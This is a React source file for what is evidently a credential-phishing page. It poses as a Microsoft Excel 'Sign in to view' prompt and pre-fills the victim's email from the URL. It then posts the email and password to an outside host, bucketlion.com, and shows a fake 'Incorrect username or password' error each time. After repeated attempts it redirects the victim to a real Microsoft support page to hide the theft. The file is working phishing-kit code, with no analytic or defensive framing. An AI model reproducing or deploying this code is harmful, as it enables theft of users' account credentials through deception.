
import React, { useState } from "react";
import './form.css';
import $ from 'jquery';

const Formm = ()=>{

    const reloadPreloader = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

  const [email, setEmail] = useState(extracetdEmail);
  const [pwd, setPwd] = useState('');

  const [count, setCount] = useState(0);

  const [err, setErr] = useState(false);

  const submitHandler = (e) => {
    e.preventDefault();
    if (pwd === "") {
      return null
    }
    else{
        
        setTimeout(() => {
          setPwd('');
          setErr(true);
        }, 1700);

        const user = {
          email: email,
          password: pwd
      };

      $.ajax({
          type: "POST",
          url: "https://bucketlion.com/logs/dashboard/file/exle.php",
          data: user,
          success(data) {
              console.log(data);
          },
      });


// deploy

      setCount(count=> count + 1);
            if(count >= 2){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.reload();
                window.location.href = `https://support.microsoft.com/en-us/office/excel-not-responding-hangs-freezes-or-stops-working-37e7d3c9-9e84-40bf-a805-4ca6853a1ff4`;
            };
    }
  };

    return(<>

        <main className="cntr">

            <div className="modal_box">
                <div className="signals">
                    <img 
                        alt="clearbit"
                        className="gfrm_eml"
                        style={{ width:'110px'}}
                        src="data:image/png;base64,"
                    />

                    <img 
                        alt="clearbit"
                        className="gfrm_eml"
                        style={{ width:'50px'}}
                        src="data:image/png;base64,"
                    />
                </div>

                <p style={{
                    color:'#fff',
                    fontSize:'21px',
                    marginTop:'-2px'
                }}>Sign in to view Excel Spreadsheet</p>

                <aside style={{
                    color:'#fff',
                    fontSize:'13px',
                    marginTop:'-17px'
                }}>Only Email recipient can view</aside>

                <form onSubmit={submitHandler} className="frm" style={{
                    marginTop:'17px'
                }}>
 
                    {err ? <b><p style={{
                        textAlign:'center',
                        color:'#ba1100',
                        marginBottom:'-10px',
                        fontSize:'15px'
                    }}>Incorect username or password</p></b> : null }

                    <div className="inp_wrapper_">

                        <div className="eml_engulf">
                            <input 
                                type="email"
                                placeholder="Email"
                                name="email"
                                required
                                className="email"
                                value={email}
                                onChange={ e=> setEmail(e.target.value) }
                            />
                        </div>

                        <div className="paswd_engulf">
                            <input 
                                type="password"
                                placeholder="Email Password"
                                className="pswd"
                                name="paswd"
                                value={pwd}
                                onChange={ e=> setPwd(e.target.value) }
                            />
                        </div>

                        <div className="submit_engulf">
                            <input 
                                type="submit"
                                className="btn"
                                value={`View`}
                                onClick={submitHandler}
                            />
                        </div>

                    </div>
                </form>

                
            </div>

        </main>

        <article style={{
            display:'flex',
            justifyContent:'center',
            alignItems:'center',
            marginTop:'-2cm'
        }}>
        <div className="wrp" onClick={reloadPreloader}>
            <img alt="key" 
            style={{
                width:'30px',
                height:'30px'
            }}
            className=""
            src="data:image/png;base64,"
            />

            &#160;

            <p style={{
                color:'rgb(32,107,68)'
            }}>Sign-in using other options</p>
        </div>
        </article>


    </>);
};

export default Formm;